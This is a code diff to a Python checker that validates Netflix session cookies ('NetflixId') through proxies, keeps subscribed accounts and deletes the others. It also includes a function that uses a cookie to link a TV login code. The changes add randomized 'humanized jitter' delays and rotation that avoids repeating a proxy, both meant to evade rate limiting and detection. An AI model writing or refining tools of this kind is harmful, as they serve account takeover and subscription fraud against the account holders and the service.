@@ -6,6 +6,7 @@ import unicodedata
 import random
 import zipfile
 import io
+import time
 from queue import Queue, Empty
 from datetime import datetime
 from typing import Any, Dict, List, Optional
@@ -336,6 +337,9 @@ def perform_extraction(html: str, original_id: str, processed_guids: set, guid_l
 def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: list, processed_guids: set, guid_lock: threading.Lock, db_callback=None, delete_callback=None):
     max_retries = 3 
     retryable_status_codes = {403, 429, 500, 502, 503, 504}
+    
+    # Thread-specific short-term memory to prevent repeating proxies
+    last_proxy = None 
 
     while True:
         try: netflix_id = q.get_nowait()
@@ -346,10 +350,27 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
             q.task_done()
             continue
 
+        # --- HUMANIZED JITTER ---
+        # Pauses the thread for a random time between 0.4 and 1.2 seconds
+        time.sleep(random.uniform(0.4, 1.2))
+
         success = False
 
         for attempt in range(max_retries):
-            proxy = random.choice(proxies) if proxies else None
+            # --- SMART PROXY SELECTION LOGIC ---
+            proxy = None
+            if proxies:
+                if len(proxies) > 1:
+                    # Filter out the proxy we just used
+                    valid_proxies = [p for p in proxies if p != last_proxy]
+                    # If valid_proxies is empty (rare edge case), fallback to the original list
+                    proxy = random.choice(valid_proxies) if valid_proxies else proxies[0]
+                else:
+                    # If there's only 1 proxy in the entire file, we have to use it
+                    proxy = proxies[0]
+                
+                # Remember this proxy for the next loop
+                last_proxy = proxy
 
             try:
                 session = requests.Session()
@@ -367,7 +388,7 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
                 if "login" in response.url.lower():
                     with print_lock:
                         stats["dead"] += 1
-                    # --- NEW: Delete if Dead ---
+                    # Delete if Dead
                     if delete_callback: delete_callback(clean_id)
                         
                 elif '"graphql":' in response.text:
@@ -383,7 +404,7 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
                         else:
                             if is_on_hold: 
                                 stats["holds"] += 1
-                                # --- NEW: Delete if On Hold ---
+                                # Delete if On Hold
                                 if delete_callback: delete_callback(clean_id)
                                 
                             if is_subscribed:
@@ -395,7 +416,7 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
                                     db_callback(db_data)
                             else:
                                 stats["free"] += 1
-                                # --- NEW: Delete if Free ---
+                                # Delete if Free
                                 if delete_callback: delete_callback(clean_id)
                 else:
                     with print_lock:
@@ -484,6 +505,9 @@ def automate_tv_login(netflix_id: str, tv_code: str, proxies: list = None) -> tu
     
     session.headers.update(headers)
     session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
+    
+    # TV Auth executes serially, so simple random.choice is fine here to maintain
+    # a continuous session through the 3 API calls
     proxy = random.choice(proxies) if proxies else None
 
     try:
